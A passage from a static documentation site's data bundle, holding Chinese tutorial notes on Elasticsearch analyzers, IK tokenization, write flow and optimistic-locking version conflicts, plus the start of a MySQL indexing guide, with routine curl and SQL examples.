"测",\n            "start_offset": 0,\n            "end_offset": 1,\n            "type": "<IDEOGRAPHIC>",\n            "position": 0\n        },\n        {\n            "token": "试",\n            "start_offset": 1,\n            "end_offset": 2,\n            "type": "<IDEOGRAPHIC>",\n            "position": 1\n        },\n        {\n            "token": "用",\n            "start_offset": 2,\n            "end_offset": 3,\n            "type": "<IDEOGRAPHIC>",\n            "position": 2\n        },\n        {\n            "token": "例",\n            "start_offset": 3,\n            "end_offset": 4,\n            "type": "<IDEOGRAPHIC>",\n            "position": 3\n        }\n    ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n这款 IK 分词器是一个插件，比较推荐的，他有两种分词器，一种是 ik_max_word，会将文本做最细力度的拆分；一种是 ik_smart，会将文本做最粗粒度的拆分。该分词器只需要下载解压到 ES 的 plugins 文件夹下，并重启 ES 即可。\n\n# ik_max_word\ncurl --location --request GET \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "analyzer":"ik_max_word",\n    "text": "测试用例"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "测试",\n            "start_offset": 0,\n            "end_offset": 2,\n            "type": "CN_WORD",\n            "position": 0\n        },\n        {\n            "token": "试用",\n            "start_offset": 1,\n            "end_offset": 3,\n            "type": "CN_WORD",\n            "position": 1\n        },\n        {\n            "token": "例",\n            "start_offset": 3,\n            "end_offset": 4,\n            "type": "CN_CHAR",\n            "position": 2\n        }\n    ]\n}\n\n# ik_smart\ncurl --location --request GET \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "analyzer":"ik_smart",\n    "text": "测试用例"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "测",\n            "start_offset": 0,\n            "end_offset": 1,\n            "type": "CN_CHAR",\n            "position": 0\n        },\n        {\n            "token": "试用",\n            "start_offset": 1,\n            "end_offset": 3,\n            "type": "CN_WORD",\n            "position": 1\n        },\n        {\n            "token": "例",\n            "start_offset": 3,\n            "end_offset": 4,\n            "type": "CN_CHAR",\n            "position": 2\n        }\n    ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n\n\nES 中也可以进行扩展词汇，首先进入 ES 根目录中的 plugins 的 ik 文件夹下，进入 config 目录，创建 custom.dic 文件，写入关键词。之后打开 IKAnalyzer.cfg.xml 文件，将新建的 custom.dic 配置其中，重启 ES 服务器。\n如：张一健\n\n# 创建 custom.dic 文件，键入关键词，并保存退出\n# 在 IKAnalyzer.cfg.xml 指定文件\n<entry key="ext_dict">custom.dic</entry>\n\n\n1\n2\n3\n\n\n测试\n\n# 配置之前\ncurl --location --request GET \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "analyzer":"ik_max_word",\n    "text": "张一健"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "张",\n            "start_offset": 0,\n            "end_offset": 1,\n            "type": "CN_CHAR",\n            "position": 0\n        },\n        {\n            "token": "一",\n            "start_offset": 1,\n            "end_offset": 2,\n            "type": "TYPE_CNUM",\n            "position": 1\n        },\n        {\n            "token": "健",\n            "start_offset": 2,\n            "end_offset": 3,\n            "type": "CN_CHAR",\n            "position": 2\n        }\n    ]\n}\n\n# 自定义后\n{\n    "tokens": [\n        {\n            "token": "张一健",\n            "start_offset": 0,\n            "end_offset": 3,\n            "type": "CN_WORD",\n            "position": 0\n        },\n        {\n            "token": "一",\n            "start_offset": 1,\n            "end_offset": 2,\n            "type": "TYPE_CNUM",\n            "position": 1\n        },\n        {\n            "token": "健",\n            "start_offset": 2,\n            "end_offset": 3,\n            "type": "CN_CHAR",\n            "position": 2\n        }\n    ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n',normalizedContent:'# 读写及更新流程\n\n\n\np 代表着分片，r 代表着副本，从图中可以看出有 2 个分片，每个分片在不同的节点上，而一个节点上有其他分片的副本，es 为内部会把分片和副本均匀的散在节点上。具体写流程如下：\n\n 1. 客户端请求集群（任意）节点，找到的节点会被称为协调节点，图中为指定 node2 为协调节点\n 2. 协调节点将请求经过对数据 hash (id) % 分片数量 得到结果后请求到另个节点或自己，图中为 p0\n 3. 主分片会将请求的数据进行保存\n 4. 主分片会将数据发送给拥有该分片副本的节点，进行数据同步\n 5. 副本保存完后进行成功反馈\n 6. 主分片得到反馈后，把自己的结果一并反馈给客户端\n\n参数            描述\nconsistency   默认值：quorum，即大多数的分片副本状态没问题就允许执行写操作；one，只要主分片状态 ok\n              就允许执行写操作；all，必须所有主分片和所有副本的状态没问题才允许执行写操作\ntimeout       如果没有足够的副本，es 会等待，希望更多的副本出现，默认情况下是 1 分钟，你可以任意更改如 30s\n\n\n\n 1. 客户端发送请求到协调节点\n 2. 协调节点计算得到数据所在的分片位置以及全部的副本位置\n 3. 得到分片位置和副本所有的位置，为达到负载均衡，进行轮训，找到一个不是很忙的节点。\n 4. 把请求转发给节点，节点得到数据并返回给客户端。\n\n\n\n 1. 客户端发送请求到协调节点\n 2. 协调节点计算得到数据所在的分片位置以及全部的副本位置\n 3. 修改，为防止多个线程修改，他会不停的尝试修改\n 4. 修改成功后修改副本，副本修改成功后会通知主分片，主分片在反馈给客户端\n\n\n# es 写索引流程\n\n\n\n 1. 用户创建了一个新文档，新文档被写入内存中；\n 2. refresh 操作提交缓存，这时缓存中数据会以 segment 的形式被先写入到文件缓存系统。这是因为，提交一个新的 segment 到磁盘需要一个 fsync 来确保 segment 被物理性地写入磁盘，这样在断电的时候就不会丢失数据。 但是 fsync 操作代价很大，如果每次索引一个文档都去执行一次的话会造成很大的性能问题，但是这里新 segment 会被先写入到文件系统缓存，这一步代价会比较低；\n 3. 新的 segment 被写入到文件缓存系统，这时内存缓存被清空。在文件缓存系统会存在一个未提交的 segment。虽然新 segment 未被 commit（刷到磁盘），但是文件已经在缓存中了，此时就可以像其它文件一样被打开和读取了；\n 4. 到目前为止索引的 segment 还未被刷新到磁盘，如果没有用 fsync 把数据从文件系统缓存刷（flush）到硬盘，我们不能保证数据在断电甚至是程序正常退出之后依然存在。elasticsearch 增加了一个 translog ，或者叫事务日志，在每一次对 elasticsearch 进行操作时均进行了日志记录。如上图所示，一个文档被索引之后，就会被添加到内存缓冲区，并且同时追加到了 translog；\n 5. 每隔一段时间，更多的文档被添加到内存缓冲区和追加到事务日志（translog），之后新 segment 被不断从内存缓存区被写入到文件缓存系统，这时内存缓存被清空，但是事务日志不会。随着 translog 变得越来越大，达到一定程度后索引被刷新，在刷新（flush）之后，segment 被全量提交（被写入硬盘）。\n\n\n# 文档分析\n\n分析器包含 将一块文本分成合适于倒排索引的独立的词条，将这些词条统一化为标准格式以提高它们的"可搜索"性，或者recall。 分析器做着如上的工作，但分析器只包含了三个主要的功能：\n\n * 字符过滤器\n   首先，字符串按顺序通过每个字符过滤器，它们的任务是在分词前整理字符串。一个字符串过滤器可以用来去掉 html，或者将 & 转化为 and。\n * 分词器\n   其次，字符串被分词器分为单个的词条。一个简单的分词器遇到空格和标点的时候，可能会将文本拆分成词条。\n * token 过滤器\n   最后，词条按顺序通过每个 token 过滤器。这个过程可能会改变词条（例如，小写化 quick），删除词条（例如，像 a，and，the 等无用词），或者增加词条（例如，像 jump 和 leap 这种同义词）\n\n\n# 内置分析器\n\nelasticsearch 还附带了可以直接使用的预包装的分析器。接下来我们会列出最重要的分析器：\n\n * 标准分析器\n   标准分析器是 elasticsearch 默认使用的分析器。它是分析各种语言文本最常用的选择。他根据 unicode 联盟定义的单词边界划分文本。删除绝大部分标点。最后，将细条小写。\n * 简单分析器\n   简单分析器在任何不是字母的地方分割文本，将词条小写。\n * 空格分析器\n   空格分析器在空格的地方划文本。\n * 语言分析器\n   特定语言分析器可用于很多语。他们可以考虑指定语言的特点。例如，英语分析器附带了一组英语无用词（常用单词，例如 and 或者 the，他们对相关性没有多少影响），他们会被删除。由于理解英语语法的规则，这个分词器可以提取英语单词的词干。\n\n\n# 测试分析器\n\n标准分析器\n\ncurl --location --request get \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "analyzer":"standard",\n    "text": "text to analyzer"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "text", // token 分解后的词条\n            "start_offset": 0, // 偏移量\n            "end_offset": 4,\n            "type": "<alphanum>",\n            "position": 0 // 位置\n        },\n        {\n            "token": "to",\n            "start_offset": 5,\n            "end_offset": 7,\n            "type": "<alphanum>",\n            "position": 1\n        },\n        {\n            "token": "analyzer",\n            "start_offset": 8,\n            "end_offset": 16,\n            "type": "<alphanum>",\n            "position": 2\n        }\n    ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\nik 分词器，这款分词器是 es 自带，并不是理想的那么好\n\ncurl --location --request get \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "text": "测试用例"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "测",\n            "start_offset": 0,\n            "end_offset": 1,\n            "type": "<ideographic>",\n            "position": 0\n        },\n        {\n            "token": "试",\n            "start_offset": 1,\n            "end_offset": 2,\n            "type": "<ideographic>",\n            "position": 1\n        },\n        {\n            "token": "用",\n            "start_offset": 2,\n            "end_offset": 3,\n            "type": "<ideographic>",\n            "position": 2\n        },\n        {\n            "token": "例",\n            "start_offset": 3,\n            "end_offset": 4,\n            "type": "<ideographic>",\n            "position": 3\n        }\n    ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n这款 ik 分词器是一个插件，比较推荐的，他有两种分词器，一种是 ik_max_word，会将文本做最细力度的拆分；一种是 ik_smart，会将文本做最粗粒度的拆分。该分词器只需要下载解压到 es 的 plugins 文件夹下，并重启 es 即可。\n\n# ik_max_word\ncurl --location --request get \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "analyzer":"ik_max_word",\n    "text": "测试用例"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "测试",\n            "start_offset": 0,\n            "end_offset": 2,\n            "type": "cn_word",\n            "position": 0\n        },\n        {\n            "token": "试用",\n            "start_offset": 1,\n            "end_offset": 3,\n            "type": "cn_word",\n            "position": 1\n        },\n        {\n            "token": "例",\n            "start_offset": 3,\n            "end_offset": 4,\n            "type": "cn_char",\n            "position": 2\n        }\n    ]\n}\n\n# ik_smart\ncurl --location --request get \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "analyzer":"ik_smart",\n    "text": "测试用例"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "测",\n            "start_offset": 0,\n            "end_offset": 1,\n            "type": "cn_char",\n            "position": 0\n        },\n        {\n            "token": "试用",\n            "start_offset": 1,\n            "end_offset": 3,\n            "type": "cn_word",\n            "position": 1\n        },\n        {\n            "token": "例",\n            "start_offset": 3,\n            "end_offset": 4,\n            "type": "cn_char",\n            "position": 2\n        }\n    ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n\n\nes 中也可以进行扩展词汇，首先进入 es 根目录中的 plugins 的 ik 文件夹下，进入 config 目录，创建 custom.dic 文件，写入关键词。之后打开 ikanalyzer.cfg.xml 文件，将新建的 custom.dic 配置其中，重启 es 服务器。\n如：张一健\n\n# 创建 custom.dic 文件，键入关键词，并保存退出\n# 在 ikanalyzer.cfg.xml 指定文件\n<entry key="ext_dict">custom.dic</entry>\n\n\n1\n2\n3\n\n\n测试\n\n# 配置之前\ncurl --location --request get \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "analyzer":"ik_max_word",\n    "text": "张一健"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "张",\n            "start_offset": 0,\n            "end_offset": 1,\n            "type": "cn_char",\n            "position": 0\n        },\n        {\n            "token": "一",\n            "start_offset": 1,\n            "end_offset": 2,\n            "type": "type_cnum",\n            "position": 1\n        },\n        {\n            "token": "健",\n            "start_offset": 2,\n            "end_offset": 3,\n            "type": "cn_char",\n            "position": 2\n        }\n    ]\n}\n\n# 自定义后\n{\n    "tokens": [\n        {\n            "token": "张一健",\n            "start_offset": 0,\n            "end_offset": 3,\n            "type": "cn_word",\n            "position": 0\n        },\n        {\n            "token": "一",\n            "start_offset": 1,\n            "end_offset": 2,\n            "type": "type_cnum",\n            "position": 1\n        },\n        {\n            "token": "健",\n            "start_offset": 2,\n            "end_offset": 3,\n            "type": "cn_char",\n            "position": 2\n        }\n    ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n',charsets:{cjk:!0}},{title:"ES 7.8.0（三） 文档冲突",frontmatter:{title:"ES 7.8.0（三） 文档冲突",date:"2023-06-25T09:22:36.000Z",permalink:"/es/1802",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/05.Elasticsearch/1802.ES%207.8.0%EF%BC%88%E4%B8%89%EF%BC%89%20%E6%96%87%E6%A1%A3%E5%86%B2%E7%AA%81.html",relativePath:"02.中间件/05.Elasticsearch/1802.ES 7.8.0（三） 文档冲突.md",key:"v-4fb47c6c",path:"/es/1802/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'文档冲突就是你在访问一个文档的时候，别人也在访问这个文档，正常来说文档的最终版本，应该是最后一个修改的人，而且这种方式只适合用于全量修改，但是如果我是局部修改，就会造成把前面修改文档的内容也覆盖掉，这就是文档冲突。\n\n解决这种文档冲突的方式，在数据库领域中有两种方式用来确保并发更新时变更不会丢失：\n\n * 悲观锁\n   这种方式被关系型数据库广泛使用，他假定有变更冲突可能发生，因此阻塞访问资源以防止冲突。一个典型的例子是读取一行数据之前先将其锁住，确保只有方式锁的线程能够对这行数据进行修改。\n * 乐观锁\n   ES 中使用的这种方法，假定冲突时不可能发生的，并且不会阻塞正在尝试的操作。然而，如果数据在读写当中被修改，更新将会失败。应用程序接下来决定该如何解决冲突。例如，可以重试更新，使用新的数据，或者将相关情况报告给用户。\n\nES 是分布式的，当文档创建、更新和删除时，新版本的文档必须复制到集群中的其他节点。ES 也是异步和并发的，这意味着这些复制请求被并行发送，并且达到目的时也许顺序是乱的。ES 需要一种方法确保文档的旧版本不会覆盖新的版本。\n\n每个文档都有一个_version（版本）号，当文档被修改时版本号递增。ES 使用这个 version 号来确保变更以正确顺序得到执行。如果旧版本的文档在新版本之后到达，它可以被简单的忽略。\n\n以下演示 ES 对于版本号的使用\n\n# 查询数据\ncurl --location --request GET \'http://10.240.30.93:9200/user/_doc/l76GEIEBBfzVdzdvUxQl\'\n\n{\n    "_index": "user",\n    "_type": "_doc",\n    "_id": "l76GEIEBBfzVdzdvUxQl",\n    "_version": 1, // 默认版本\n    "_seq_no": 0, // 序列号\n    "_primary_term": 3,\n    "found": true,\n    "_source": {\n        "name": "zhangsan"\n    }\n}\n\n# 修改数据\ncurl --location --request POST \'http://10.240.30.93:9200/user/_update/l76GEIEBBfzVdzdvUxQl\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "doc":{\n        "name": "zhangsan1"\n    }\n}\'\n\n{\n    "_index": "user",\n    "_type": "_doc",\n    "_id": "l76GEIEBBfzVdzdvUxQl",\n    "_version": 2, // 版本递增\n    "result": "updated",\n    "_shards": {\n        "total": 3,\n        "successful": 1,\n        "failed": 0\n    },\n    "_seq_no": 1, // 序列号也增加了\n    "_primary_term": 3 // 主分片次数\n}\n\n# 如果针对以上有并发修改，都修改name字段，我们可以指定 if_seq_no 和 if_primary_term 修改\ncurl --location --request POST \'http://10.240.30.93:9200/user/_update/l76GEIEBBfzVdzdvUxQl?if_seq_no=1&if_primary_term=3\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "doc":{\n        "name": "zhangsan2"\n    }\n}\'\n\n# 当然我们也可以指定他的版本，但是version的值一定要比原值高\ncurl --location --request POST \'http://10.240.30.93:9200/user/_doc/l76GEIEBBfzVdzdvUxQl?version=4&version_type=external\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "name": "zhangsan2"\n}\'\n\n{\n    "_index": "user",\n    "_type": "_doc",\n    "_id": "l76GEIEBBfzVdzdvUxQl",\n    "_version": 4,\n    "result": "updated",\n    "_shards": {\n        "total": 3,\n        "successful": 1,\n        "failed": 0\n    },\n    "_seq_no": 3,\n    "_primary_term": 3\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n * _seq_no\n    严格递增的顺序号，每个文档一个，Shard 级别严格递增，保证后写入的 Doc 的_seq_no 大于先写入的 Doc 的_seq_no。\n    任何类型的写操作，包括 index、create、update 和 Delete，都会生成一个_seq_no。\n    每个文档在使用 Lucene 的 document 操作接口之前，会获取到一个_seq_no，这个_seq_no 会以系统保留 Field 的名义存储到 Lucene 中，文档写入 Lucene 成功后，会标记该 seq_no 为完成状态，这时候会使用当前 seq_no 更新 local_checkpoint。\n\n * _primary_term\n     _primary_term 也和_seq_no 一样是一个整数，每当 Primary Shard 发生重新分配时，比如重启，Primary 选举等，_primary_term 会递增 1。\n    _primary_term 主要是用来恢复数据时处理当多个文档的_seq_no 一样时的冲突，避免 Primary Shard 上的写入被覆盖。',normalizedContent:'文档冲突就是你在访问一个文档的时候，别人也在访问这个文档，正常来说文档的最终版本，应该是最后一个修改的人，而且这种方式只适合用于全量修改，但是如果我是局部修改，就会造成把前面修改文档的内容也覆盖掉，这就是文档冲突。\n\n解决这种文档冲突的方式，在数据库领域中有两种方式用来确保并发更新时变更不会丢失：\n\n * 悲观锁\n   这种方式被关系型数据库广泛使用，他假定有变更冲突可能发生，因此阻塞访问资源以防止冲突。一个典型的例子是读取一行数据之前先将其锁住，确保只有方式锁的线程能够对这行数据进行修改。\n * 乐观锁\n   es 中使用的这种方法，假定冲突时不可能发生的，并且不会阻塞正在尝试的操作。然而，如果数据在读写当中被修改，更新将会失败。应用程序接下来决定该如何解决冲突。例如，可以重试更新，使用新的数据，或者将相关情况报告给用户。\n\nes 是分布式的，当文档创建、更新和删除时，新版本的文档必须复制到集群中的其他节点。es 也是异步和并发的，这意味着这些复制请求被并行发送，并且达到目的时也许顺序是乱的。es 需要一种方法确保文档的旧版本不会覆盖新的版本。\n\n每个文档都有一个_version（版本）号，当文档被修改时版本号递增。es 使用这个 version 号来确保变更以正确顺序得到执行。如果旧版本的文档在新版本之后到达，它可以被简单的忽略。\n\n以下演示 es 对于版本号的使用\n\n# 查询数据\ncurl --location --request get \'http://10.240.30.93:9200/user/_doc/l76geiebbfzvdzdvuxql\'\n\n{\n    "_index": "user",\n    "_type": "_doc",\n    "_id": "l76geiebbfzvdzdvuxql",\n    "_version": 1, // 默认版本\n    "_seq_no": 0, // 序列号\n    "_primary_term": 3,\n    "found": true,\n    "_source": {\n        "name": "zhangsan"\n    }\n}\n\n# 修改数据\ncurl --location --request post \'http://10.240.30.93:9200/user/_update/l76geiebbfzvdzdvuxql\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "doc":{\n        "name": "zhangsan1"\n    }\n}\'\n\n{\n    "_index": "user",\n    "_type": "_doc",\n    "_id": "l76geiebbfzvdzdvuxql",\n    "_version": 2, // 版本递增\n    "result": "updated",\n    "_shards": {\n        "total": 3,\n        "successful": 1,\n        "failed": 0\n    },\n    "_seq_no": 1, // 序列号也增加了\n    "_primary_term": 3 // 主分片次数\n}\n\n# 如果针对以上有并发修改，都修改name字段，我们可以指定 if_seq_no 和 if_primary_term 修改\ncurl --location --request post \'http://10.240.30.93:9200/user/_update/l76geiebbfzvdzdvuxql?if_seq_no=1&if_primary_term=3\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "doc":{\n        "name": "zhangsan2"\n    }\n}\'\n\n# 当然我们也可以指定他的版本，但是version的值一定要比原值高\ncurl --location --request post \'http://10.240.30.93:9200/user/_doc/l76geiebbfzvdzdvuxql?version=4&version_type=external\' \\\n--header \'content-type: application/json\' \\\n--data-raw \'{\n    "name": "zhangsan2"\n}\'\n\n{\n    "_index": "user",\n    "_type": "_doc",\n    "_id": "l76geiebbfzvdzdvuxql",\n    "_version": 4,\n    "result": "updated",\n    "_shards": {\n        "total": 3,\n        "successful": 1,\n        "failed": 0\n    },\n    "_seq_no": 3,\n    "_primary_term": 3\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n * _seq_no\n    严格递增的顺序号，每个文档一个，shard 级别严格递增，保证后写入的 doc 的_seq_no 大于先写入的 doc 的_seq_no。\n    任何类型的写操作，包括 index、create、update 和 delete，都会生成一个_seq_no。\n    每个文档在使用 lucene 的 document 操作接口之前，会获取到一个_seq_no，这个_seq_no 会以系统保留 field 的名义存储到 lucene 中，文档写入 lucene 成功后，会标记该 seq_no 为完成状态，这时候会使用当前 seq_no 更新 local_checkpoint。\n\n * _primary_term\n     _primary_term 也和_seq_no 一样是一个整数，每当 primary shard 发生重新分配时，比如重启，primary 选举等，_primary_term 会递增 1。\n    _primary_term 主要是用来恢复数据时处理当多个文档的_seq_no 一样时的冲突，避免 primary shard 上的写入被覆盖。',charsets:{cjk:!0}},{title:"MySQL 索引介绍",frontmatter:{title:"MySQL 索引介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/mysql/1300",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/03.%E5%A4%A7%E6%95%B0%E6%8D%AE/04.mysql/1300.MySQL%20%E7%B4%A2%E5%BC%95%E4%BB%8B%E7%BB%8D.html",relativePath:"03.大数据/04.mysql/1300.MySQL 索引介绍.md",key:"v-1b92a67a",path:"/mysql/1300/",headers:[{level:2,title:"MySQL中索引的语法",slug:"mysql中索引的语法",normalizedTitle:"mysql 中索引的语法",charIndex:2},{level:3,title:"创建索引",slug:"创建索引",normalizedTitle:"创建索引",charIndex:19},{level:3,title:"注意：",slug:"注意",normalizedTitle:"注意：",charIndex:329},{level:3,title:"根据索引查询",slug:"根据索引查询",normalizedTitle:"根据索引查询",charIndex:409},{level:3,title:"删除索引",slug:"删除索引",normalizedTitle:"删除索引",charIndex:1219},{level:3,title:"查看表中的索引",slug:"查看表中的索引",normalizedTitle:"查看表中的索引",charIndex:1323},{level:3,title:"查看查询语句使用索引的情况",slug:"查看查询语句使用索引的情况",normalizedTitle:"查看查询语句使用索引的情况",charIndex:1367},{level:2,title:"索引的优缺点",slug:"索引的优缺点",normalizedTitle:"索引的优缺点",charIndex:1464},{level:2,title:"索引的分类",slug:"索引的分类",normalizedTitle:"索引的分类",charIndex:1652},{level:3,title:"常见的索引类型有：主键索引、唯一索引、普通索引、全文索引、组合索引",slug:"常见的索引类型有-主键索引、唯一索引、普通索引、全文索引、组合索引",normalizedTitle:"常见的索引类型有：主键索引、唯一索引、普通索引、全文索引、组合索引",charIndex:1662},{level:2,title:"索引的实现原理",slug:"索引的实现原理",normalizedTitle:"索引的实现原理",charIndex:2498},{level:3,title:"哈希索引：",slug:"哈希索引",normalizedTitle:"哈希索引：",charIndex:2600},{level:3,title:"全文索引：",slug:"全文索引",normalizedTitle:"全文索引：",charIndex:1995},{level:3,title:"注意：",slug:"注意-2",normalizedTitle:"注意：",charIndex:329},{level:3,title:"BTree索引和B+Tree索引",slug:"btree索引和b-tree索引",normalizedTitle:"btree 索引和 b+tree 索引",charIndex:3825},{level:2,title:"索引的使用策略",slug:"索引的使用策略",normalizedTitle:"索引的使用策略",charIndex:6937},{level:3,title:"什么时候要使用索引？",slug:"什么时候要使用索引",normalizedTitle:"什么时候要使用索引？",charIndex:6949},{level:3,title:"什么时候不要使用索引？",slug:"什么时候不要使用索引",normalizedTitle:"什么时候不要使用索引？",charIndex:7162},{level:3,title:"索引失效的情况：",slug:"索引失效的情况",normalizedTitle:"索引失效的情况：",charIndex:7408},{level:2,title:"索引的优化",slug:"索引的优化",normalizedTitle:"索引的优化",charIndex:8314}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"MySQL中索引的语法 创建索引 注意： 根据索引查询 删除索引 查看表中的索引 查看查询语句使用索引的情况 索引的优缺点 索引的分类 常见的索引类型有：主键索引、唯一索引、普通索引、全文索引、组合索引 索引的实现原理 哈希索引： 全文索引： 注意： BTree索引和B+Tree索引 索引的使用策略 什么时候要使用索引？ 什么时候不要使用索引？ 索引失效的情况： 索引的优化",content:"# MySQL 中索引的语法\n\n\n# 创建索引\n\n在创建表的时候添加索引\n\nCREATE TABLE mytable(  \n    ID INT NOT NULL,   \n    username VARCHAR(16) NOT NULL,  \n    INDEX [indexName] (username(length))  \n); \n\n\n1\n2\n3\n4\n5\n\n\n在创建表以后添加索引\n\nALTER TABLE my_table ADD [UNIQUE] INDEX index_name(column_name);\n# 或者\nCREATE INDEX index_name ON my_table(column_name);\n\n\n1\n2\n3\n\n\n\n# 注意：\n\n 1. 索引需要占用磁盘空间，因此在创建索引时要考虑到磁盘空间是否足够\n 2. 创建索引时需要对表加锁，因此实际操作中需要在业务空闲期间进行\n\n\n# 根据索引查询\n\n--具体查询：\nSELECT * FROM table_name WHERE column_1=column_2;(为column_1建立了索引)\n\n--或者模糊查询\nSELECT * FROM table_name WHERE column_1 LIKE '%三'\nSELECT * FROM table_name WHERE column_1 LIKE '三%'\nSELECT * FROM table_name WHERE column_1 LIKE '%三%'\n\nSELECT * FROM table_name WHERE column_1 LIKE '_好_'\n\n--如果要表示在字符串中既有A又有B，那么查询语句为：\nSELECT * FROM table_name WHERE column_1 LIKE '%A%' AND column_1 LIKE '%B%';\n\nSELECT * FROM table_name WHERE column_1 LIKE '[张李王]三';  --表示column_1中有匹配张三、李三、王三的都可以\nSELECT * FROM table_name WHERE column_1 LIKE '[^张李王]三';  --表示column_1中有匹配除了张三、李三、王三的其他三都可以\n\n-- 在模糊查询中，%表示任意0个或多个字符；_表示任意单个字符（有且仅有），通常用来限制字符串长度;[]表示其中的某一个字符；[^]表示除了其中的字符的所有字符\n\n--或者在全文索引中模糊查询\nSELECT * FROM table_name WHERE MATCH(content) AGAINST('word1','word2',...);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 删除索引\n\nDROP INDEX my_index ON tablename;\n--或者\nALTER TABLE table_name DROP INDEX index_name;\n\n\n1\n2\n3\n\n\n\n# 查看表中的索引\n\nSHOW INDEX FROM tablename\n\n\n1\n\n\n\n# 查看查询语句使用索引的情况\n\n-- explain 查询语句\nexplain SELECT * FROM table_name WHERE column_1='123';\n\n\n1\n2\n\n\n\n# 索引的优缺点\n\n优势：可以快速检索，减少 I/O 次数，加快检索速度；根据索引分组和排序，可以加快分组和排序；\n\n劣势：索引本身也是表，因此会占用存储空间，一般来说，索引表占用的空间的数据表的 1.5 倍；索引表的维护和创建需要时间成本，这个成本随着数据量增大而增大；构建索引会降低数据表的修改操作（删除，添加，修改）的效率，因为在修改数据表的同时还需要修改索引表；\n\n\n# 索引的分类\n\n\n# 常见的索引类型有：主键索引、唯一索引、普通索引、全文索引、组合索引\n\n1、主键索引：即主索引，根据主键 